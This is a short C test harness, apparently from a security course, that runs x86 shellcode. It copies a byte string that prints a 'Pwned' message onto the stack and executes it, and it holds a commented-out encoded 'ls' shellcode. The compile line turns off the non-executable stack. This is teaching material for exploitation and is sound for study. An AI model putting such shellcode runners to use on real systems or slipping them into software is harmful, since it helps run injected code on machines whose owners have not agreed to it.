#include <stdlib.h>
#include <stdio.h>
#include <string.h>

//Compile with:  gcc -m32 -z execstack -o test_shellcode test_shellcode.c
//Run with: ./test_shellcode

// Pwned message shellcoe
const char shellcode[] = \
 "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x1d"
"\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x50\x77"
"\x6e\x65\x64\x20\x62\x79\x3a\x20\x43\x53\x43\x33\x39\x34\x30\x20\x41"
"\x74\x74\x61\x63\x6b\x65\x72\x73\x21\x0a";

// ls shellcode
// const char shellcode[] = \
// "\xbe\xc0\x78\x18\x8e\xdb\xcc\xd9\x74\x24\xf4\x58\x31\xc9"
// "\xb1\x0b\x31\x70\x15\x03\x70\x15\x83\xc0\x04\xe2\x35\x12"
// "\x13\xd6\x2c\xb1\x45\x8e\x63\x55\x03\xa9\x13\xb6\x60\x5e"
// "\xe3\xa0\xa9\xfc\x8a\x5e\x3f\xe3\x1e\x77\x37\xe4\x9e\x87"
// "\x67\x86\xf7\xe9\x58\x2a\x74\xf6\xf1\xe1\xf3\x17\x30\x85";

int main(int argc, char **argv)
{
   char code[500];

   strcpy(code, shellcode);
   int (*func)() = (int(*)())code;

   func();
   return 1;
}

